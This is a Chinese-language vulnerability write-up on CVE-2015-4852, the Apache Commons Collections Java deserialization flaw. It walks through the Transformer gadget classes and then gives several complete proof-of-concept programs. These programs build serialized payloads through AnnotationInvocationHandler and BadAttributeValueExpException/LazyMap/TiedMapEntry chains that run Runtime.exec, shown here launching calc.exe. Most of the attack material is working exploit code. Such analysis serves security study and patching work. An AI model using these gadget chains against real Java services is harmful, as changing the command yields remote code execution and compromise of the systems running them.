# 反序列化漏洞 CVE-2015-4852

## 漏洞概述

​	主要是org.apache.commons.collections存在潜在的远程代码执行漏洞，应用的是java的反序列化部分机制的问题。在Java反序列化中，对于传入的序列化数据没有进行安全性检查，将恶意的TransformedMap序列化，可能会导致远程命令执行。



## 基本信息

​	org.apache.commons.collections 是一个java的集成框架，是对java.util的扩展封装。在使用这个库的时候，会产生远程代码执行危险。

​	Java的反序列化与序列化操作存在隐含的危险，反序列化时需要从文件中读取数据还原成类，因此会调用readObject函数。java在反序列化时，会先调用被序列化类重写的readObject方法。也就是说，如果我们构造的恶意的类对象，其中的readObject函数中存在危险操作就可以执行。这个漏洞就是使用org.apache.commons.collections中的几个函数通过这种方式来进行payload构造。



## POC

```
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.*;
import org.apache.commons.collections.map.TransformedMap;

import java.lang.reflect.Method;
import java.util.*;


public class TranformerDemo {

    public static void main(String[] args){

        ChainedTransformer chain = null;
        Transformer[] transformers = new Transformer[] {
                new ConstantTransformer( Runtime.class ),
                new InvokerTransformer( "getMethod", new Class[]{ String.class, Class[].class},
                        new Object[]{ "getRuntime", null} ),
                new InvokerTransformer( "invoke", new Class[]{ Object.class, Object[].class },
                        new Object[]{ null, null}),
                new InvokerTransformer( "exec", new Class[]{ String.class},
                        new Object[] { "calc.exe" }) };
        chain = new ChainedTransformer( transformers );

        Map m = new HashMap();
        m.put( "1", "1" );
        Map map = TransformedMap.decorate(m, null, chain );
        map.put( "a", "b" );

    }
}
```

实际我们想要执行的命令就是：

```
((Runtime)Runtime.class.getMethod( "getRuntime", null) .invoke( null, null )).exec( "cal.exe" );
```

​	代码里提到了几个关键类，TransformedMap、InvokerTransformer、ChainedTransformer、ConstantTransformer、Transformer。下边会进行仔细的介绍。



## Transformer

​	org.apache.commons.collections.Transformer类，是其他几个类的父类，主要用于**从一个对象变为另一个对象**。

​	Transfomer接口，该接口仅定义了一个方法，就是transform（Object input）方法，利用的主要是他的三个实现类。

```
import org.apache.commons.collections.Transformer;

public class TranformerDemo {
    public static void main(String[] args){
        Transformer tran = new Transformer() {
            public Object transform(Object input) {
                System.out.println( input.getClass() );  
                //class java.lang.Class
                return null;
            }
        };
        tran.transform( Runtime.class );
    }
}
```



## ConstantTransformer 通过转换获得内部类的对象类型

```
public class ConstantTransformer<I, O> implements Transformer<I, O>, Serializable {

    public static final Transformer NULL_INSTANCE = new ConstantTransformer<Object, Object>(null);

    private final O iConstant;
    ...
    ...
    public O transform(final I input) {
        return iConstant;  //重写了Transformer的transform方法
    }
```

​	方法transform返回的是 **iConstant 变量**（可控）。

​	ConstantTransformer类通过transform方法转换得到内部类的对象类型，例如：参数为Runtime.class时，经过ConstantTransformer执行后返回 java.lang.Runtime。

```
ConstantTransformer tran = new ConstantTransformer( Runtime.class );
//通过调试可以发现，在内部完成了对Runtime的对象类型构造。
```



## InvokerTransformer 通过反射创建新的对象实例

```
public InvokerTransformer(final String methodName, final Class<?>[] paramTypes, final Object[] args) {
    super();
    iMethodName = methodName; //要进行反射的对象
    iParamTypes = paramTypes != null ? paramTypes.clone() : null; //调用的方法名称以及参数类型
    iArgs = args != null ? args.clone() : null;//对应的方法参数
}

public O transform(final Object input) {//通过反射创建一个新的对象实例
    
    final Class<?> cls = input.getClass();//获取到传进来的input对象值，就是Runtime对象
    final Method method = cls.getMethod(iMethodName, iParamTypes);//Method方法对象的名字以及函数的参数
    return (O) method.invoke(input, iArgs);//将获取的方法和参数进行执行
}
```

```
InvokerTransformer tran = new InvokerTransformer( "getMethod", new Class[]{
            String.class, Class[].class}, new Object[]{
            "getRuntime", null} );
System.out.println( tran.transform( Runtime.class ).toString() );
//输出：public static java.lang.Runtime
//第一个参数是传进来的getMethod方法，
//第二个参数是getMethod方法的参数列表（String.class, Class[].class）
//第三个参数是需要反射的方法其执行的参数列表，这里就是getRuntime方法，以及参数null。
```

​	理解了一下InvokerTranformer类之后就是构造反射链的过程了。

```
((Runtime)Runtime.class.getMethod( "getRuntime", null) .invoke( null, null )).exec( "cal.exe" );
//构造 Runtime.getRuntime().exec("calc.exe") 的过程
InvokerTransformer tran = new InvokerTransformer( "getMethod", new Class[]{
    String.class, Class[].class}, new Object[]{"getRuntime", null} );
    
//获得反射的GetRuntime()方法
Method method = (Method) tran.transform( Runtime.class );
//java.lang.Runtime.getRuntime()输出的是一个类

//invoke反射过程，将GetRuntime反射成对象，只有对象才能调用exec函数。
InvokerTransformer tran2 = new InvokerTransformer( "invoke", new Class[]{
    Object.class, Object[].class }, new Object[]{null, null} );
//获得Runtime的对象
Runtime run = (Runtime) tran2.transform( method );

//进行exec("calc.exe")的构造
InvokerTransformer tran3 = new InvokerTransformer( "exec", new Class[]{
    String.class}, new Object[]{"calc.exe"} );
tran3.transform( run );
```



## ChainedTransformer 反射链的构造

```
//就是利用了for循环，将transformers[i]运行了transform方法。
public T transform(T object) {
    for (final Transformer<? super T, ? extends T> iTransformer : iTransformers) {
        object = iTransformer.transform(object);
    }
    return object;
}
```

利用ChainedTransformer类进行反射链的构造。

```
ChainedTransformer chain = null;
Transformer[] transformers = new Transformer[] { 
		new ConstantTransformer( Runtime.class ),
    	new InvokerTransformer( "getMethod", new Class[]{ String.class, Class[].class},new Object[]{ "getRuntime", null} ),
        new InvokerTransformer( "invoke", new Class[]{ Object.class, Object[].class },new Object[]{ null, null}),
        new InvokerTransformer( "exec", new Class[]{ String.class}, new Object[] { "calc.exe" }) };

chain = new ChainedTransformer( transformers );
chain.transform( Object.class );
```

​	反射链有了，那么如何让反射链进行执行呢，又是怎么跟反序列化联系在一起的呢。就用到了TransformedMap。



## TransformedMap

​	对Java标准数据结构Map接口的一个扩展，该类可以在一个元素被加到集合内时，自动的对该元素进行特定的修饰变换，具体的变换逻辑由Transformer类定义，Transformer在TransformedMap进行实例化时作为参数传入。

​	可以通过TransformedMap.decorate()方法 ，来获得一个TransformedMap实例。

```
Map map = TransformedMap.decorate(map, keyTransformer,  valueTransformer);

    protected Object checkSetValue(Object value) {
        return this.valueTransformer.transform(value);
    }
```

​	当key或者value发生变化时，就会触发相应的Transfromer的transfrom()的方法。另外，可以使用之前提到的ChainedTransformer。触发时，ChainedTransformer可以按照顺序调用一系列的变换。**也就是说这里的valueTransformer可以进行人为的构造为之前的payload，使其可以进行远程代码执行。**

- 我们再看一下对于反序列化漏洞的描述：

  ​	在Java反序列化中，对于传入的序列化数据进行安全性检查，将恶意的TransformedMap序列化，可能会导致远程命令执行。
  
  ​	如何使应用触发Transformer变换呢：我们在反序列化的时候，会调用被反序列化的readObject方法。那么如果某个可序列化的类重写了readObject方法，并且对变量进行了键值修改的操作，这个Map变量是可控的就可能实现攻击。

## AnnotationInvocationHandler

```
class AnnotationInvocationHandler implements InvocationHandler, Serializable {
    private final Class<? extends Annotation> type;
    private final Map<String, Object> memberValues;

    AnnotationInvocationHandler(Class<? extends Annotation> type, Map<String, Object> memberValues) {
        this.type = type;
        this.memberValues = memberValues;
    }
    private void readObject(java.io.ObjectInputStream s)
        throws java.io.IOException, ClassNotFoundException {
        s.defaultReadObject();

        Map<String, Class<?>> memberTypes = annotationType.memberTypes();

//对于memberValues的每一项调用了setValue（）函数。
        for (Map.Entry<String, Object> memberValue : memberValues.entrySet()) {
            String name = memberValue.getKey();
            Class<?> memberType = memberTypes.get(name);
            if (memberType != null) {  // i.e. member still exists
                Object value = memberValue.getValue();
                if (!(memberType.isInstance(value) ||
                      value instanceof ExceptionProxy)) {
                    memberValue.setValue(
                        new AnnotationTypeMismatchExceptionProxy(
                            value.getClass() + "[" + value + "]").setMember(
                                annotationType.members().get(name)));
                }
            }
        }
    }
}
```

```
        public Object setValue(Object value) {
            value = this.parent.checkSetValue(value);
            return super.entry.setValue(value);
        }
```

这个类，满足了需要的可序列化、重写了readObject方法、有memberValue为Map类型变量并可控、还有memberValue.setValue的操作。我们只需要实例化一个AnnotationInvocation类，并将其成员变量memberValue设为我们精心构造的TransformedMap对象，然后将其进行序列化，提交给应用。应用在进行反序列化的时候就可以进行远程代码执行了。（jdk1.8不可用）

​	后边就是具体的攻击过程了。https://www.anquanke.com/post/id/173459

## POC

```
import java.io.File;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.lang.annotation.Retention;
import java.lang.reflect.Constructor;
import java.util.HashMap;
import java.util.Map;
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.map.TransformedMap;
import org.apache.commons.collections.keyvalue.TiedMapEntry;
import org.apache.commons.collections.map.LazyMap;
import javax.management.BadAttributeValueExpException;
import java.lang.reflect.Field;

public class Demo {

    public static Object Reverse_Payload() throws Exception {
        Transformer[] transformers = new Transformer[] {
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getMethod", new Class[] { String.class, Class[].class }, new Object[] { "getRuntime", null }),
                new InvokerTransformer("invoke", new Class[] { Object.class, Object[].class }, new Object[] { null, null }),
                new InvokerTransformer("exec", new Class[] { String.class }, new Object[] { "calc.exe" }) };
        ChainedTransformer transformerChain = new ChainedTransformer(transformers);

        Map innermap = new HashMap();
        innermap.put("value", "value");
        //AnnotationInvocationHandler 在1.8的jdk不能用
        Map outmap = TransformedMap.decorate(innermap, null, transformerChain);
        outmap.set(a,b);
        //通过反射获得AnnotationInvocationHandler类对象
        Class cls = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
        //通过反射获得cls的构造函数
        Constructor ctor = cls.getDeclaredConstructor(Class.class, Map.class);
        //这里需要设置Accessible为true，否则序列化失败
        //启用和禁用访问安全检查的开关，值为 true，则表示反射的对象在使用时应该取消java的访问检查。
        ctor.setAccessible(true);
        //通过newInstance()方法实例化对象
        Object instance = ctor.newInstance(Retention.class, outmap);
        return instance;
    }

    public static void main(String[] args) throws Exception {
        generatePayload(Reverse_Payload(),"obj");
        payloadTest("C:\\Users\\varas\\IdeaProjects\\Demo\\obj");
    }
    public static void generatePayload(Object instance, String file)
            throws Exception {
        //将构造好的payload序列化后写入文件中
        File f = new File(file);
        ObjectOutputStream out = new ObjectOutputStream(new FileOutputStream(f));
        out.writeObject(instance);
        out.flush();
        out.close();
    }
    public static void payloadTest(String file) throws Exception {
        //读取写入的payload，并进行反序列化
        ObjectInputStream in = new ObjectInputStream(new FileInputStream(file));
        in.readObject();
        in.close();
    }
}
```



> 由于上述方法在1.8jdk上不能使用，引入下面的另外一种方法

## BadAttributeValueExpException

```
private void readObject(ObjectInputStream ois) throws IOException, ClassNotFoundException {
        ObjectInputStream.GetField gf = ois.readFields();
        Object valObj = gf.get("val", null);

        if (valObj == null) {
            val = null;
        } else if (valObj instanceof String) {
            val= valObj;
        } else if (System.getSecurityManager() == null
                || valObj instanceof Long
                || valObj instanceof Integer
                || valObj instanceof Float
                || valObj instanceof Double
                || valObj instanceof Byte
                || valObj instanceof Short
                || valObj instanceof Boolean) {
            val = valObj.toString();
        } else { // the serialized object is from a version without JDK-8019292 fix
            val = System.identityHashCode(valObj) + "@" + valObj.getClass().getName();
        }
}
```

可以看到是反序列化传入的对象，判断其成员val的类型，如果变量不是字符串便会调用toString方法。我们这里传入的是一个LazyMap类的对象，在调用toString方法时会调用LazyMap.get方法，从而触发绑定的transform方法。

## LazyMap

```
    public Object get(Object key) {
        if (!super.map.containsKey(key)) {
            Object value = this.factory.transform(key);
            super.map.put(key, value);
            return value;
        } else {
            return super.map.get(key);
        }
    }
```

但是只有当键值不存在的时候才会触发transform，因此引入另一个类TiedMapEntry

## TiedMapEntry

```
public TiedMapEntry(Map map, Object key) {
        this.map = map;
        this.key = key;
    }
    public Object getKey() {
        return this.key;
    }
    public Object getValue() {
        return this.map.get(this.key);
    }
    public String toString() {
        return this.getKey() + "=" + this.getValue();
    }
```

当触发toString方法的时候可以调用其绑定的映射去获取预定的键值。

## POC链

**BadAtrributeValueException对象exception  ->**
**exception对象的val设置为lazyMap的TiedMapEntry,键为lazyMap中不存在的键 ->**
**调用entry的toString() ->**
**调用lazyMap的get方法获取这个不存在的键 ->**
**调用transform方法**

## poc

```
import java.io.File;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.lang.annotation.Retention;
import java.lang.reflect.Constructor;
import java.util.HashMap;
import java.util.Map;
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.map.TransformedMap;
import org.apache.commons.collections.keyvalue.TiedMapEntry;
import org.apache.commons.collections.map.LazyMap;
import javax.management.BadAttributeValueExpException;
import java.lang.reflect.Field;

public class Demo {

    public static Object Reverse_Payload() throws Exception {
        Transformer[] transformers = new Transformer[] {
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getMethod", new Class[] { String.class, Class[].class }, new Object[] { "getRuntime", null }),
                new InvokerTransformer("invoke", new Class[] { Object.class, Object[].class }, new Object[] { null, null }),
                new InvokerTransformer("exec", new Class[] { String.class }, new Object[] { "calc.exe" }) };
        ChainedTransformer transformerChain = new ChainedTransformer(transformers);

        Map innermap = new HashMap();
        innermap.put("value", "value");

        // 该类重写了readObject方法，并在readObject中有一个可控的地图进行修改的过程
        Map lazyMap = LazyMap.decorate(innermap, transformerChain);

        TiedMapEntry entry = new TiedMapEntry(lazyMap,"foo");

        BadAttributeValueExpException exception = new BadAttributeValueExpException(null);
        Field valField = exception.getClass().getDeclaredField("val");
        valField.setAccessible(true);
        valField.set(exception,entry);
        return exception;
    }

    public static void main(String[] args) throws Exception {
        generatePayload(Reverse_Payload(),"obj");
        //payloadTest("C:\\Users\\varas\\IdeaProjects\\Demo\\obj");
    }
    public static void generatePayload(Object instance, String file)
            throws Exception {
        //将构造好的payload序列化后写入文件中
        File f = new File(file);
        ObjectOutputStream out = new ObjectOutputStream(new FileOutputStream(f));
        out.writeObject(instance);
        out.flush();
        out.close();
    }
    public static void payloadTest(String file) throws Exception {
        //读取写入的payload，并进行反序列化
        ObjectInputStream in = new ObjectInputStream(new FileInputStream(file));
        in.readObject();
        in.close();
    }
}
```



参考链接： https://paper.seebug.org/312/#2